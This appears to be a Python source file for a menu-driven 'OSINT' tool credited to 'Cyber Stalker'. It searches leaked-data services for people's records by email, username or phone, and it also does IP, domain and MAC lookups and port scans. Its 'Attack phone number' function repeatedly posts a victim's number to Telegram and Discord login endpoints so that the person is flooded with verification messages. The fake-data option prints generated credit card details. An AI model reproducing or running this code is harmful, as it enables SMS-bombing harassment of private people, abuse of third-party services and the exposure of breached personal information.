import requests
import os
import json
from colorama import init, Fore, Style
import socket
from faker import Faker
import time
import sys
from pathlib import Path

init(autoreset=True)

API_URL = "https://server.leakosint.com/"
CONFIG_FILE = Path(os.path.expanduser("~/.cyberosint_config.json"))
fake = Faker()

BANNER = f"""{Fore.GREEN}{Style.BRIGHT.center(80)}
 ██████╗██╗   ██╗██████╗ ███████╗██████╗      ██████╗ ███████╗██╗███╗   ██╗████████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██║   ██║███████╗██║██╔██╗ ██║   ██║   
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██║   ██║╚════██║██║██║╚██╗██║   ██║   
╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ╚██████╔╝███████║██║██║ ╚████║   ██║   
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
                       {Fore.YELLOW} .:Code by - {Fore.RED}Cyber Stalker:.
                       {Fore.BLUE}::Telegram - {Fore.RED}@CYB3R_ST4LK3R::"""
MENU = f"""{Fore.GREEN}{Style.BRIGHT.center(80)}
{Fore.GREEN}                 ╔═════════════════════════════════════╗
{Fore.GREEN}                 ║ {Fore.YELLOW}1. {Fore.GREEN}Search leaks by email            {Fore.GREEN}║
{Fore.GREEN}                 ║ {Fore.YELLOW}2. {Fore.GREEN}Search leaks by username         {Fore.GREEN}║
{Fore.GREEN}                 ║ {Fore.YELLOW}3. {Fore.GREEN}Search leaks by phone            {Fore.GREEN}║
{Fore.GREEN}                 ║ {Fore.YELLOW}4. {Fore.GREEN}Search by IP                     {Fore.GREEN}║
{Fore.GREEN}                 ║ {Fore.YELLOW}5. {Fore.GREEN}Generate random data             {Fore.GREEN}║
{Fore.GREEN}                 ║ {Fore.YELLOW}6. {Fore.GREEN}Search by domain                 {Fore.GREEN}║
{Fore.GREEN}                 ║ {Fore.YELLOW}7. {Fore.GREEN}Port scanner                     {Fore.GREEN}║
{Fore.GREEN}                 ║ {Fore.YELLOW}8. {Fore.GREEN}Search by MAC address            {Fore.GREEN}║
{Fore.GREEN}                 ║ {Fore.YELLOW}9. {Fore.GREEN}Attack phone number              {Fore.GREEN}║
{Fore.GREEN}                 ╚═════════════════════════════════════╝
                       {Fore.GREEN}           ╔════════════════╗
                       {Fore.GREEN}           ║ {Fore.YELLOW}10. {Fore.RED}Exit       {Fore.GREEN}║
                       {Fore.GREEN}           ║ {Fore.YELLOW}11. {Fore.RED}logout     {Fore.GREEN}║
                       {Fore.GREEN}           ╚════════════════╝"""

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def load_config():
    if CONFIG_FILE.exists():
        with open(CONFIG_FILE, 'r') as file:
            return json.load(file)
    return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as file:
        json.dump(config, file)

def search_leaks(request, token, limit=1000):
    data = {
        "token": token,
        "request": request,
        "limit": limit
    }
    try:
        response = requests.post(API_URL, json=data)
        response.raise_for_status()
        return handle_response(response)
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: {e}")
        return {"error": "Request failed"}

def handle_response(response):
    if response.status_code == 200:
        return response.json()
    else:
        return {"error": response.status_code, "message": response.text}

def print_leak_info(leak_info):
    if 'NumOfResults' in leak_info and leak_info['NumOfResults'] > 0:
        for source, details in leak_info['List'].items():
            print(f"{Fore.CYAN}Source: {Fore.GREEN}{source}")
            for record in details['Data']:
                if isinstance(record, dict):
                    for key, value in record.items():
                        if key != 'InfoLeak':
                            print(f"{Fore.CYAN}  - {key}: {Fore.GREEN}{value}")
    else:
        print(f"{Fore.RED}No results found.")

def search_by_ip(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        response.raise_for_status()
        data = response.json()
        for key, value in data.items():
            print(f"{Fore.CYAN}{key.capitalize()}: {Fore.GREEN}{value}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: {e}")

def logout_and_delete_config():
    try:
        CONFIG_FILE.unlink()
        print(f"{Fore.RED}Config file deleted. Logging out...")
    except FileNotFoundError:
        print(f"{Fore.RED}Config file not found. Logging out anyway...")
    except Exception as e:
        print(f"{Fore.RED}Error occurred while deleting config file: {e}")
    exit()

def generate_random_data():
    print(f"{Fore.CYAN}Name: {Fore.GREEN}{fake.name()}")
    print(f"{Fore.CYAN}Address: {Fore.GREEN}{fake.address()}")
    print(f"{Fore.CYAN}Email: {Fore.GREEN}{fake.email()}")
    print(f"{Fore.CYAN}Phone: {Fore.GREEN}{fake.phone_number()}")
    print(f"{Fore.CYAN}Credit Card: {Fore.GREEN}{fake.credit_card_full()}")
    print(f"{Fore.CYAN}Password: {Fore.GREEN}{fake.password()}")

def search_by_domain(domain):
    try:
        response = requests.get(f"https://api.domainsdb.info/v1/domains/search?domain={domain}")
        response.raise_for_status()
        data = response.json()
        if 'domains' in data:
            for domain_info in data['domains']:
                for key, value in domain_info.items():
                    print(f"{Fore.CYAN}{key.capitalize()}: {Fore.GREEN}{value}")
        else:
            print(f"{Fore.RED}No information found for the domain.")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: {e}")

def port_scanner(ip, start_port, end_port):
    print(f"{Fore.CYAN}Scanning ports {start_port}-{end_port} on {ip}...")
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(f"{Fore.GREEN}Port {port}: Open")
        else:
            print(f"{Fore.RED}Port {port}: Closed")
        sock.close()

def search_by_mac(mac):
    try:
        response = requests.get(f"https://api.macvendors.com/{mac}")
        response.raise_for_status()
        print(f"{Fore.CYAN}Vendor: {Fore.GREEN}{response.text}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: {e}")

def perform_attack(phone_number, num_rounds):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Content-Type': 'application/x-www-form-urlencoded'}
    rounds = 0
    try:
        for _ in range(num_rounds):
            time.sleep(1)
            try:
                requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': phone_number})
                requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': phone_number})
                requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': phone_number})
                requests.get('https://telegram.org/support?setln=ru', headers=headers)
                requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': phone_number})
                requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={"phone": phone_number})
                rounds += 1
                print(Fore.WHITE + "[INFO] Request sent successfully")
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"Request error: {e}")
    except Exception as e:
        print(Fore.RED + f"Error occurred: {e}")

def main():
    clear_screen()
    config = load_config()

    if 'name' in config and 'token' in config:
        name = config['name']
        token = config['token']
        print(f"Welcome back, {name}!")
    else:
        name = input("Enter your name: ")
        token = input("Enter your token: ")
        config['name'] = name
        config['token'] = token
        save_config(config)

    while True:
        clear_screen()
        print(BANNER)
        print(MENU)
        choice = input(f"{Fore.CYAN}Enter your choice: {Fore.GREEN}")
        clear_screen()
        print(BANNER)
        if choice.isdigit() and 1 <= int(choice) <= 11:
            choice = int(choice)
            if choice == 1:
                email = input(f"{Fore.CYAN}Enter email: {Fore.GREEN}")
                limit = input(f"{Fore.CYAN}Enter limit (100-10000, default 1000): {Fore.GREEN}") or 1000
                limit = int(limit)
                result = search_leaks(email, token, limit)
                print_leak_info(result)
                input(f"\n{Fore.CYAN}Press Enter to return to menu >> ")
            elif choice == 2:
                username = input(f"{Fore.CYAN}Enter username: {Fore.GREEN}")
                limit = input(f"{Fore.CYAN}Enter limit (100-10000, default 1000): {Fore.GREEN}") or 1000
                limit = int(limit)
                result = search_leaks(username, token, limit)
                print_leak_info(result)
                input(f"\n{Fore.CYAN}Press Enter to return to menu >> ")
            elif choice == 3:
                phone = input(f"{Fore.CYAN}Enter phone: {Fore.GREEN}")
                limit = input(f"{Fore.CYAN}Enter limit (100-10000, default 1000): {Fore.GREEN}") or 1000
                limit = int(limit)
                result = search_leaks(phone, token, limit)
                print_leak_info(result)
                input(f"\n{Fore.CYAN}Press Enter to return to menu >> ")
            elif choice == 4:
                ip = input(f"{Fore.CYAN}Enter IP address: {Fore.GREEN}")
                search_by_ip(ip)
                input(f"\n{Fore.CYAN}Press Enter to return to menu >> ")
            elif choice == 5:
                generate_random_data()
                input(f"\n{Fore.CYAN}Press Enter to return to menu >> ")
            elif choice == 6:
                domain = input(f"{Fore.CYAN}Enter domain: {Fore.GREEN}")
                search_by_domain(domain)
                input(f"\n{Fore.CYAN}Press Enter to return to menu >> ")
            elif choice == 7:
                ip = input(f"{Fore.CYAN}Enter IP address: {Fore.GREEN}")
                start_port = int(input(f"{Fore.CYAN}Enter start port: {Fore.GREEN}"))
                end_port = int(input(f"{Fore.CYAN}Enter end port: {Fore.GREEN}"))
                port_scanner(ip, start_port, end_port)
                input(f"\n{Fore.CYAN}Press Enter to return to menu >> ")
            elif choice == 8:
                mac = input(f"{Fore.CYAN}Enter MAC address: {Fore.GREEN}")
                search_by_mac(mac)
                input(f"\n{Fore.CYAN}Press Enter to return to menu >> ")
            elif choice == 9:
                phone = input(f"{Fore.CYAN}Enter phone number for attack: {Fore.GREEN}")
                num_rounds = int(input(f"{Fore.CYAN}Enter number of rounds: {Fore.GREEN}"))
                perform_attack(phone, num_rounds)
                input(f"\n{Fore.CYAN}Press Enter to return to menu >> ")
            elif choice == 10:
                print(f"{Fore.RED}Exiting...")
                break
            elif choice == 11:
                logout_and_delete_config()
        else:
            print(f"{Fore.RED}Invalid choice, please try again.")
            input(f"\n{Fore.CYAN}Press Enter to return to menu >> ")

if __name__ == "__main__":
    main()
